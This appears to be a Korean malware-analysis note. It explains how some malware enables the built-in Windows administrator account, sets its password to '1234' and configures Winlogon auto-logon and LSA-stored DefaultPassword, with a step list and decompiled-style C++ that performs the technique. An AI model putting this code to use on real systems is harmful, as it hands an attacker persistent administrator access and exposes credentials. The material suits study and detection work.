### Concept

악성 코드가 admin 계정으로 자동 로그인 설정하는 경우가 존재


### Code Flow

1. NetUserEnum API를 사용해 유저 정보를 획득
2. user_id가 500(관리자)인지 확인
3. 만약 UF_ACCOUNTDISABLE 플래그가 존재하면 제거
4. password를 변경
5. user_name을 획득
6. GetComputerNameW를 사용해 domain_name을 획득
7. NetUserSetInfo를 사용해 변경 정보를 등록
8. 레지스트리 "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" 키 오픈
9. 레지스트리 "AutoAdminLogon", "DefaultUserName", "DefaultDomainName"를 설정
10. LsaStorePrivateData API를 사용해 "DefaultPassword"를 저장
11. 레지스트리 "DefaultPassword"를 설정

### USER_INFO_3

```c++
typedef struct _USER_INFO_3 {
  LPWSTR usri3_name;
  LPWSTR usri3_password;
  DWORD  usri3_password_age;
  DWORD  usri3_priv;
  LPWSTR usri3_home_dir;
  LPWSTR usri3_comment;
  DWORD  usri3_flags;
  LPWSTR usri3_script_path;
  DWORD  usri3_auth_flags;
  LPWSTR usri3_full_name;
  LPWSTR usri3_usr_comment;
  LPWSTR usri3_parms;
  LPWSTR usri3_workstations;
  DWORD  usri3_last_logon;
  DWORD  usri3_last_logoff;
  DWORD  usri3_acct_expires;
  DWORD  usri3_max_storage;
  DWORD  usri3_units_per_week;
  PBYTE  usri3_logon_hours;
  DWORD  usri3_bad_pw_count;
  DWORD  usri3_num_logons;
  LPWSTR usri3_logon_server;
  DWORD  usri3_country_code;
  DWORD  usri3_code_page;
  DWORD  usri3_user_id;
  DWORD  usri3_primary_group_id;
  LPWSTR usri3_profile;
  LPWSTR usri3_home_dir_drive;
  DWORD  usri3_password_expired;
} USER_INFO_3, *PUSER_INFO_3, *LPUSER_INFO_3;
```

### Example

```c++
h_resume = NULL;
NetUserEnum(NULL, 0x3, 0x2, &usri3, 0xffffffff, &n_table, &total_table, &h_resume);
usri3_iter = usri3;
do {
	if (usri3_iter->usri3_user_id == 500) {
		if (usri3_iter->usri3_flags & UF_ACCOUNTDISABLE != 0x0) {
		  usri3_iter->usri3_flags = usri3_iter->usri3_flags ^ UF_ACCOUNTDISABLE;
		}
		
		password = "1234";
		usri3_iter->usri3_password = password;
		user_name = usri3_iter->usri3_name;
		GetComputerNameW(domain_name, &ret_len);
		
		NetUserSetInfo(0x0, user_name, 0x1, usri3_iter, 0x0);
		break;
	}
	usri3_iter = usri3_iter + 0x1;
	n_table = n_table - 0x1;
} while (n_table != 0x0);
NetApiBufferFree(usri3);

RegCreateKeyExW(HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
				0x0, 0x0, 0x0,0x20106,0x0, &hkey, 0x0);

data = L'1';
RegSetValueExW(hkey, "AutoAdminLogon", 0x0, 0x1, &data, 0x4);
user_name_len = wcslen(user_name);
RegSetValueExW(h_key, "DefaultUserName", 0x0, 0x1, user_name, user_name_len * 0x2 + 0x2);
domain_name_len = wcslen(domain_name);
RegSetValueExW(h_key, "DefaultDomainName", 0x0, 0x1, domain_name, domain_name_len * 0x2 + 0x2);

lsa_oa.Length = 0x18;
LsaOpenPolicy(NULL, &lsa_oa, 0x20, &h_policy);
RtlInitUnicodeString(&u_key, "DefaultPassword");
RtlInitUnicodeString(&u_value, password);
LsaStorePrivateData(h_policy, &u_key, &u_value);
LsaClose(h_policy);

password_len = wcslen(password);
RegSetValueExW(h_key, "DefaultPassword", 0x0, 0x1, password, password_len * 0x2 + 0x2);
ZwClose(hkey);
```